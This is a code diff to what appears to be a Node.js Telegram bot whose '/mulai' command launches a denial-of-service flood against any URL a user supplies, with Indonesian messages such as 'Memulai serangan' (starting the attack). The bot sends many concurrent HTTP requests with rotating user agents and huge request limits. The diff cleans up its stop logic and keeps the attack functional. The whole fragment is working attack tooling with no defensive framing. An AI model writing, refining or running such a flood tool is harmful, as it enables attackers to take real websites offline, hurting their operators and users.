@@ -135,15 +135,13 @@ bot.onText(/\/mulai\s+(.+)/, (msg, match) => {
 
     if (activeAttacks.has(url)) {
         bot.sendMessage(chatId, "❗ Serangan ke URL ini sudah berjalan.");
-    return;
+        return;
     }
 
-    // Tambahkan protokol jika tidak ada
     if (!url.startsWith("http://") && !url.startsWith("https://")) {
         url = `https://${url}`;
     }
 
-    // Validasi URL
     try {
         new URL(url);
     } catch (error) {
@@ -154,14 +152,12 @@ bot.onText(/\/mulai\s+(.+)/, (msg, match) => {
     bot.sendMessage(chatId, "🚀 Memulai serangan... 🤣");
     const attackController = { running: true };
     activeAttacks.set(url, attackController);
-    const maxRequests = 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // Batas realistis
-    const requestsPerSecond = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // Batas kecepatan
+    const maxRequests = 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // bisa disesuaikan
+    const requestsPerSecond = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;
 
     const attack = () => {
         try {
             if (!attackController.running) return;
-
-            if (!continueAttack) return;
 
             const userAgent = randElement(userAgents);
             const headers = {
@@ -169,11 +165,6 @@ bot.onText(/\/mulai\s+(.+)/, (msg, match) => {
             };
 
             axios.get(url, { headers })
-                .then((response) => {
-                    if (response.status === 503) {
-                        bot.sendMessage(chatId, "Server merespons 503, melanjutkan...");
-                    }
-                })
                 .catch((error) => {
                     if (error.response && error.response.status === 502) {
                         bot.sendMessage(chatId, "Error: Permintaan gagal dengan status 502");
@@ -187,13 +178,14 @@ bot.onText(/\/mulai\s+(.+)/, (msg, match) => {
         }
     };
 
-    const numThreads = 100; // Kurangi untuk stabilitas
+    const numThreads = 100;
     for (let i = 0; i < numThreads; i++) {
         attack();
     }
 
     setTimeout(() => {
-        continueAttack = false;
+        attackController.running = false;
+        activeAttacks.delete(url);
         bot.sendMessage(chatId, "Batas maksimum permintaan tercapai. Serangan dihentikan.");
     }, maxRequests / requestsPerSecond * 1000);
 });
